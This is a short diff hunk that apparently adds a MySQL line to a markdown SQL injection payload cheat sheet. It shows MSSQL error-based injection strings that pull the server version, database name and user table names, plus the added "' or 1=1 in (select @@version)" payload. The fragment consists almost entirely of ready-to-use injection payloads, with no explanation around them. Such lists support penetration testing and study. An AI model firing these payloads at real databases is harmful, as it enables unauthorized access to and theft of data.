@@ -418,6 +418,9 @@ if (@@VERSION)=9 select 1 else select 2;
 ' AND 1=CONVERT(int, (SELECT @@version)) -- -
 ' AND 1=CONVERT(int, DB_NAME()) -- -
 ' AND 1=CONVERT(int,(SELECT STRING_AGG(name, ',') FROM sysobjects WHERE xtype='U'))-- -
+
+-- MySQL
+' or 1=1 in (select @@version) -- //
 ~~~
 
 ## Filter bypass
